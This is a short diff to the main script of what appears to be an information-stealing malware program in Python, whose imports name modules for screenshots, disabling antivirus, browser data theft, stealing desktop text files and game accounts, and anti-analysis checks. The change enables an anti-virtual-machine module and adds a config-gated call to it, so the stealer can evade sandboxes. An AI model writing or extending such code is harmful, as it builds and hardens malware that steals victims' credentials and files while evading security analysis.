@@ -6,7 +6,7 @@ import time
 from modules.screan_shot.screan_shot import screan_shot
 from modules.antianalysis.check_analysis import Anti_Analysis
 from modules.antivirus.antivirus import deseble_defander
-# from modules.antiVM.antiVM import AntiVm
+from modules.antiVM.antiVM import AntiVm
 from modules.Browsers.Browser import Walkthrough#
 from modules.client_files.client_files import steal_desktop_txt_file
 from modules.software_files.games.games import gamesSteal
@@ -37,7 +37,8 @@ def main() -> None:
     
     if config.get("checkAnalysis") == True:
             Anti_Analysis() # anti analysis
-            
+    if config.get("antiVM") == True:
+        AntiVm() # anti vm
     if config.get("antiCIS") == True:
         anti_cis() # anti cis
         
